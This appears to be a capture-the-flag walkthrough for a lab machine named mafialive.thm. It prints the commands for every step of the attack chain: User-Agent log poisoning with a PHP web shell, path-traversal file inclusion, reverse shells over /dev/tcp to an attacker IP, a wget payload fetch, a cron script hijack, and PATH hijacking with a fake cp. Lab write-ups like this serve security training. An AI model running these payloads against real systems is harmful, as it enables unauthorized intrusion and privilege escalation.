User-Agent Spoofing (BurpSuite)
#

We modify the php using the user-Agent parameter:

<?php system($_GET['cmd']);?>

We can execute commands using the parameter &cmd=

http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id

We load a shell in php using wget.

We create a file, in my case I call it shell.php, with the following content:

<?php
    system("bash -c 'bash -i >& /dev/tcp/10.8.189.249/443 0>&1'")
?>

We set up a web server in Python to upload our malicious file to the victim machine.

python3 -m http.server 80

We load a shell in PHP using wget, executing this command on the victim machine.

http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://10.8.189.249:8000/shell.php

We see that he made a request to our server, so we already have the file on the victim machine.

We listen with netcat:

sudo nc -nlvp 443

And we upload the file from the web.

We already have a shell like www-data.

Lateral movement
#

There is a cron task that runs from time to time, we have write permissions on this file, so we are going to put a shell in it, to switch to the archangel user.

cat /etc/crontab


echo 'bash -i >& /dev/tcp/10.8.189.249/4444 0>&1' >> /opt/helloworld.sh

We listen and wait for the cron task to run, so that it gives us a shell when executing helloword.sh.

We are already the user archangel.

Creation of malicious cp
#

We are going to create a false cp which we add to the path so that it gives us a bash when we run the binary.

We go to this folder path.

cd /tmp

We create a file called cat in which we will put this content:

echo '#!/bin/bash' > cp
echo "/bin/bash" >> cp

We give you execution permissions:

chmod +x cp

We add the file path to the Path.

export PATH=$PWD:$PATH

By running the binary again, we are already root.
